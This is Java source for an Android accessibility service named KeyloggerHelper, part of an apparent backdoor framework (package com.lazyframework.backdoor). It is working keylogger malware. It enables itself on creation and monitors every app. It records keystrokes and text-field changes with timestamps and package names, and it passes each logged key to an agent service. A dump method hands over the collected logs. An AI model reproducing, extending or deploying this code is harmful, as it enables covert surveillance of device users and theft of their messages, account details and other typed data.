package com.lazyframework.backdoor;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.os.Build;
import android.util.Log;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicBoolean;

public class KeyloggerHelper extends AccessibilityService {

    private static final String TAG = "LazyFramework";

    // ==================== STATIC REFERENCES ====================
    private static AgentService agentService;
    private static KeyloggerHelper instance;
    private static boolean isServiceRunning = false;

    // ==================== KEYLOGGING STATE ====================
    private final AtomicBoolean isKeyloggingEnabled = new AtomicBoolean(false);
    private String lastText = "";
    private String lastPackageName = "";
    private String lastClassName = "";

    // ==================== BUFFER ====================
    private final StringBuilder keyBuffer = new StringBuilder();
    private final StringBuilder fullLogBuffer = new StringBuilder();
    private static final int MAX_BUFFER_SIZE = 500000;
    private static final int MAX_LOG_SIZE = 1000000;

    // ==================== KEY MAPPING ====================
    private static final ConcurrentHashMap<Integer, String> KEY_MAP = new ConcurrentHashMap<>();
    private static final ConcurrentHashMap<Integer, String> SHIFT_KEY_MAP = new ConcurrentHashMap<>();

    static {
        // Letters
        KEY_MAP.put(KeyEvent.KEYCODE_A, "a"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_A, "A");
        KEY_MAP.put(KeyEvent.KEYCODE_B, "b"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_B, "B");
        KEY_MAP.put(KeyEvent.KEYCODE_C, "c"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_C, "C");
        KEY_MAP.put(KeyEvent.KEYCODE_D, "d"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_D, "D");
        KEY_MAP.put(KeyEvent.KEYCODE_E, "e"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_E, "E");
        KEY_MAP.put(KeyEvent.KEYCODE_F, "f"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_F, "F");
        KEY_MAP.put(KeyEvent.KEYCODE_G, "g"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_G, "G");
        KEY_MAP.put(KeyEvent.KEYCODE_H, "h"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_H, "H");
        KEY_MAP.put(KeyEvent.KEYCODE_I, "i"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_I, "I");
        KEY_MAP.put(KeyEvent.KEYCODE_J, "j"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_J, "J");
        KEY_MAP.put(KeyEvent.KEYCODE_K, "k"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_K, "K");
        KEY_MAP.put(KeyEvent.KEYCODE_L, "l"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_L, "L");
        KEY_MAP.put(KeyEvent.KEYCODE_M, "m"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_M, "M");
        KEY_MAP.put(KeyEvent.KEYCODE_N, "n"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_N, "N");
        KEY_MAP.put(KeyEvent.KEYCODE_O, "o"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_O, "O");
        KEY_MAP.put(KeyEvent.KEYCODE_P, "p"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_P, "P");
        KEY_MAP.put(KeyEvent.KEYCODE_Q, "q"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_Q, "Q");
        KEY_MAP.put(KeyEvent.KEYCODE_R, "r"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_R, "R");
        KEY_MAP.put(KeyEvent.KEYCODE_S, "s"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_S, "S");
        KEY_MAP.put(KeyEvent.KEYCODE_T, "t"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_T, "T");
        KEY_MAP.put(KeyEvent.KEYCODE_U, "u"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_U, "U");
        KEY_MAP.put(KeyEvent.KEYCODE_V, "v"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_V, "V");
        KEY_MAP.put(KeyEvent.KEYCODE_W, "w"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_W, "W");
        KEY_MAP.put(KeyEvent.KEYCODE_X, "x"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_X, "X");
        KEY_MAP.put(KeyEvent.KEYCODE_Y, "y"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_Y, "Y");
        KEY_MAP.put(KeyEvent.KEYCODE_Z, "z"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_Z, "Z");

        // Numbers & Symbols
        KEY_MAP.put(KeyEvent.KEYCODE_0, "0"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_0, ")");
        KEY_MAP.put(KeyEvent.KEYCODE_1, "1"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_1, "!");
        KEY_MAP.put(KeyEvent.KEYCODE_2, "2"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_2, "@");
        KEY_MAP.put(KeyEvent.KEYCODE_3, "3"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_3, "#");
        KEY_MAP.put(KeyEvent.KEYCODE_4, "4"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_4, "$");
        KEY_MAP.put(KeyEvent.KEYCODE_5, "5"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_5, "%");
        KEY_MAP.put(KeyEvent.KEYCODE_6, "6"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_6, "^");
        KEY_MAP.put(KeyEvent.KEYCODE_7, "7"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_7, "&");
        KEY_MAP.put(KeyEvent.KEYCODE_8, "8"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_8, "*");
        KEY_MAP.put(KeyEvent.KEYCODE_9, "9"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_9, "(");

        KEY_MAP.put(KeyEvent.KEYCODE_PERIOD, "."); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_PERIOD, ">");
        KEY_MAP.put(KeyEvent.KEYCODE_COMMA, ","); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_COMMA, "<");
        KEY_MAP.put(KeyEvent.KEYCODE_SLASH, "/"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_SLASH, "?");
        KEY_MAP.put(KeyEvent.KEYCODE_BACKSLASH, "\\"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_BACKSLASH, "|");
        KEY_MAP.put(KeyEvent.KEYCODE_GRAVE, "`"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_GRAVE, "~");
        KEY_MAP.put(KeyEvent.KEYCODE_MINUS, "-"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_MINUS, "_");
        KEY_MAP.put(KeyEvent.KEYCODE_EQUALS, "="); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_EQUALS, "+");
        KEY_MAP.put(KeyEvent.KEYCODE_LEFT_BRACKET, "["); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_LEFT_BRACKET, "{");
        KEY_MAP.put(KeyEvent.KEYCODE_RIGHT_BRACKET, "]"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_RIGHT_BRACKET, "}");
        KEY_MAP.put(KeyEvent.KEYCODE_SEMICOLON, ";"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_SEMICOLON, ":");
        KEY_MAP.put(KeyEvent.KEYCODE_APOSTROPHE, "'"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_APOSTROPHE, "\"");
        KEY_MAP.put(KeyEvent.KEYCODE_SPACE, " "); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_SPACE, " ");
    }

    // ==================== SERVICE LIFECYCLE ====================

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        isServiceRunning = true;
        Log.d(TAG, "⌨️ KeyloggerHelper created");

        isKeyloggingEnabled.set(true);
        configureService();
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        isServiceRunning = true;
        isKeyloggingEnabled.set(true);
        configureService();
        Log.d(TAG, "✅ KeyloggerHelper service connected (Android 12+)");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!isKeyloggingEnabled.get()) return;

        try {
            int eventType = event.getEventType();

            if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                handleTextChanged(event);
            }

            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                handleWindowChange(event);
            }

            if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                handleViewClicked(event);
            }

        } catch (Exception e) {
            Log.e(TAG, "❌ Event error", e);
        }
    }

    private void handleWindowChange(AccessibilityEvent event) {
    }

    // ==================== KEY EVENT (UTAMA UNTUK ANDROID 12+) ====================
    @Override
    protected boolean onKeyEvent(KeyEvent event) {
        if (!isKeyloggingEnabled.get()) {
            return super.onKeyEvent(event);
        }

        if (event.getAction() == KeyEvent.ACTION_DOWN) {
            String key = getKeyString(event);
            if (key != null && !key.isEmpty()) {
                String packageName = lastPackageName != null ? lastPackageName : "unknown";
                String className = lastClassName != null ? lastClassName : "unknown";

                logKey(packageName, className, key, false);

                if (agentService != null) {
                    agentService.onKeyLogged(key);
                }

                Log.d(TAG, "⌨️ KeyEvent: " + key + " | " + packageName);
            }
        }

        return super.onKeyEvent(event); // Jangan consume event
    }

    private String getKeyString(KeyEvent event) {
        int keyCode = event.getKeyCode();
        boolean isShiftPressed = event.isShiftPressed() ||
                (event.getMetaState() & KeyEvent.META_SHIFT_ON) != 0;

        if (isShiftPressed && SHIFT_KEY_MAP.containsKey(keyCode)) {
            return SHIFT_KEY_MAP.get(keyCode);
        }
        if (KEY_MAP.containsKey(keyCode)) {
            return KEY_MAP.get(keyCode);
        }

        // Special keys
        switch (keyCode) {
            case KeyEvent.KEYCODE_ENTER: return "[ENTER]";
            case KeyEvent.KEYCODE_DEL: return "[BACKSPACE]";
            case KeyEvent.KEYCODE_FORWARD_DEL: return "[DELETE]";
            case KeyEvent.KEYCODE_TAB: return "[TAB]";
            case KeyEvent.KEYCODE_SPACE: return " ";
            case KeyEvent.KEYCODE_BACK: return "[BACK]";
            case KeyEvent.KEYCODE_VOLUME_UP: return "[VOL_UP]";
            case KeyEvent.KEYCODE_VOLUME_DOWN: return "[VOL_DOWN]";
        }

        // Unicode fallback
        int unicode = event.getUnicodeChar();
        if (unicode != 0) {
            return String.valueOf((char) unicode);
        }

        return null;
    }

    // ==================== TEXT CHANGED (BACKUP) ====================
    private void handleTextChanged(AccessibilityEvent event) {
        try {
            CharSequence[] text = event.getText().toArray(new CharSequence[0]);
            if (text == null || text.length == 0) return;

            String newText = text[0].toString();
            if (newText.isEmpty()) return;

            String packageName = event.getPackageName() != null ?
                    event.getPackageName().toString() : "unknown";
            String className = event.getClassName() != null ?
                    event.getClassName().toString() : "unknown";

            if (!packageName.equals(lastPackageName)) {
                logWindowChange(packageName, className);
                lastPackageName = packageName;
                lastClassName = className;
            }

            String changed = detectTextChange(lastText, newText);
            if (changed != null && !changed.isEmpty()) {
                boolean isPassword = false;
                AccessibilityNodeInfo source = event.getSource();
                if (source != null) {
                    isPassword = source.isPassword();
                    source.recycle();
                }

                logKey(packageName, className, changed, isPassword);
                if (agentService != null) agentService.onKeyLogged(changed);
            }

            lastText = newText;

        } catch (Exception e) {
            Log.e(TAG, "Text changed error", e);
        }
    }

    private String detectTextChange(String oldText, String newText) {
        if (oldText == null) oldText = "";
        if (newText == null) newText = "";
        if (oldText.equals(newText)) return null;

        int oldLen = oldText.length();
        int newLen = newText.length();

        if (newLen < oldLen) {
            // Deletion
            return "[DEL]";
        }

        if (newLen > oldLen) {
            int diffPos = 0;
            int minLen = Math.min(oldLen, newLen);
            for (int i = 0; i < minLen; i++) {
                if (oldText.charAt(i) != newText.charAt(i)) {
                    diffPos = i;
                    break;
                }
                diffPos = i + 1;
            }
            return newText.substring(diffPos);
        }

        return null;
    }

    // ==================== LOGGING ====================
    private void logKey(String packageName, String className, String keyText, boolean isPassword) {
        if (keyText == null || keyText.isEmpty()) return;

        String displayText = isPassword ? "[PWD:******]" : keyText;

        String timestamp = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
        String logEntry = String.format("[%s] %s: %s\n", timestamp, packageName, displayText);

        appendToBuffer(logEntry);
    }

    private void logWindowChange(String packageName, String className) {
        String timestamp = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
        String logEntry = String.format("\n=== [%s] WINDOW: %s ===\n", timestamp, packageName);
        appendToBuffer(logEntry);
        lastPackageName = packageName;
        lastClassName = className;
    }

    private void handleViewClicked(AccessibilityEvent event) {
        // Optional - bisa dikembangkan
    }

    private synchronized void appendToBuffer(String text) {
        keyBuffer.append(text);
        fullLogBuffer.append(text);

        if (fullLogBuffer.length() > MAX_LOG_SIZE) {
            int cut = fullLogBuffer.indexOf("\n", fullLogBuffer.length() / 2);
            if (cut > 0) fullLogBuffer.delete(0, cut + 1);
        }
        if (keyBuffer.length() > MAX_BUFFER_SIZE) {
            int cut = keyBuffer.indexOf("\n", keyBuffer.length() / 2);
            if (cut > 0) keyBuffer.delete(0, cut + 1);
        }
    }

    // ==================== CONFIGURATION (ANDROID 12+) ====================
    private void configureService() {
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;

        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS |
                AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            info.flags |= AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY;
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            info.flags |= AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE;
        }

        info.notificationTimeout = 50;
        info.packageNames = null; // monitor semua app

        setServiceInfo(info);
        Log.d(TAG, "✅ Accessibility configured for Android 12+");
    }

    // ==================== PUBLIC API ====================
    public static void setAgentService(AgentService service) {
        agentService = service;
    }

    public static KeyloggerHelper getInstance() {
        return instance;
    }

    public static boolean isRunning() {
        return isServiceRunning && instance != null;
    }

    public void startKeylogging() {
        isKeyloggingEnabled.set(true);
        Log.d(TAG, "✅ Keylogging started");
    }

    public void stopKeylogging() {
        isKeyloggingEnabled.set(false);
        Log.d(TAG, "⏹️ Keylogging stopped");
    }

    public String dumpKeylogs() {
        synchronized (this) {
            String logs = fullLogBuffer.toString();
            fullLogBuffer.setLength(0);
            fullLogBuffer.append("=== NEW SESSION ").append(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date())).append(" ===\n");
            return logs;
        }
    }

    @Override
    public void onInterrupt() {
        Log.w(TAG, "⚠️ Keylogger interrupted");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isServiceRunning = false;
        instance = null;
        isKeyloggingEnabled.set(false);
        Log.d(TAG, "⌨️ KeyloggerHelper destroyed");
    }

    public void clearLogs() {

    }
}